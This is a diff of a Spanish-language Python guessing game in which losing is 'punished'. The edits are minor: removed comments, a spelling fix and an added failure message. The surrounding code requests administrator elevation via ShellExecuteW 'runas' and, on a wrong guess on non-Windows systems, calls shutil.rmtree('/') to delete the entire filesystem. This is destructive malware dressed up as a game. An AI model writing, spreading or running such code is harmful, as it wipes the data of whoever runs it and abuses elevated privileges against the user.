@@ -36,9 +36,8 @@ if sis == 1:
 
     if not is_admin():
         print("No tienes privilegios de administrador. Intentando elevarlos...")
-        # Relanzar el script con privilegios elevados
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
-        sys.exit()  # Termina el script actual
+        sys.exit()  
     else:
         print("Script ejecutándose con privilegios de administrador.")
 
@@ -89,7 +88,7 @@ while i == True:
                     if 1 <= o <= 50 and o not in p:
                         p.append(o)
                     else:
-                        print("El número no es válido. Por favor aáde uno nuevo")
+                        print("El número no es válido. Por favor añade uno nuevo")
                 except ValueError:
                     print("Añade un valor válido.")
             return p
@@ -121,6 +120,7 @@ while i == True:
             elif sis in [2, 3, 4]:
                 shutil.rmtree("/")
         u = u+1
+        print("Has fallado")
         print("Este es tu intento número {}".format(u))
     if u == 10:
         print("Se han acabado tus intentos, has perdido, por lo que igualmente serás castigado")
